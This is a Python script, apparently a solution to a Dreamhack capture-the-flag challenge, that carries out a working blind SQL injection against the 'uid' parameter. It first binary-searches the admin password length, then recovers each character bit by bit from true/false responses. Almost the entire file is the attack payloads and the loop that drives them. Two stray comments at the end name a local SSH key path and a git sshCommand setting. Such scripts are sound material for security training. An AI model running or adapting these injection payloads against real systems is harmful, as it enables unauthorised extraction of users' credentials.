import requests
import sys

def get_url(port, query):
    return f'http://host1.dreamhack.games:{port}/?uid={query}'

def binary(port):
    l, r = 1, 10000
    while l < r:
        m = (l + r) // 2
        query = f"admin' and CHAR_LENGTH(upw) <= {m} -- -"
        url = get_url(port, query)
        res = requests.get(url)
        if 'exists' in res.text:
            r = m
        else:
            l = m + 1
    return r

def get_password(port, pw_length):
    ret = ''
    for i in range(1, pw_length + 1):
        bit_l = 0
        while True:
            bit_l += 1
            query = f"admin' and length(bin(ord(substr(upw, {i}, 1)))) = {bit_l}-- -"

            url = get_url(port, query)
            res = requests.get(url)
            if 'exists' in res.text:
                break
        bit = ''
        for j in range(1, bit_l + 1):
            query = f"admin' and substr(bin(ord(substr(upw, {i}, 1))), {j}, 1) = '1'-- -"
            url = get_url(port, query)
            res = requests.get(url)
            if 'exists' in res.text:
                bit += '1'
            else:
                bit += '0'
        print(i, '\'th >>', bit)
        ret += int.to_bytes(int(bit, 2), (bit_l + 7) // 8, "big").decode('utf-8')
    return ret
    

if __name__ == '__main__':
    port = sys.argv[1]
    pw_length = binary(port)
    print(f'pw length >> {pw_length}')
    pw = get_password(port, pw_length)
    print(f'pw >> {pw}')

    # /Users/doyeopkim/.ssh/git_id_rsa
    # git config --add --local core.sshCommand '/Users/doyeopkim/.ssh/git_id_rsa.pub'